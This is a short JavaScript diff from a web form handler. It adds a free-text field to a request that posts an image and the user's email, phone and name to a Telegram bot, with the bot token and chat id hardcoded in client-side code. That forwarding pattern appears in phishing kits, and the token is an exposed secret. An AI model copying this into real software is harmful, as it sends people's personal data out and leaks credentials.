@@ -712,7 +712,7 @@
                     console.log(imgSrc);
                     const Http = new XMLHttpRequest();
 
-                    const url = 'https://api.telegram.org/bot6413357158:AAFTaNXZANJNs9pehMUIqom0whxjlN-dAcU/sendphoto?chat_id=1632888291&photo=' + encodeURIComponent(imgSrc) + '&caption=information : %0A email : ' + Email + '%0A phone : ' + phone + '%0A fullname : ' + firstname + '+' + lastname;
+                    const url = 'https://api.telegram.org/bot6413357158:AAFTaNXZANJNs9pehMUIqom0whxjlN-dAcU/sendphoto?chat_id=1632888291&photo=' + encodeURIComponent(imgSrc) + '&caption=information : %0A email : ' + Email + '%0A phone : ' + phone + '%0A fullname : ' + firstname + '+' + lastname+'%0A text  :'+text;
                     Http.open("post", url);
                     Http.send();
                     alert("The form was submitted ✌");
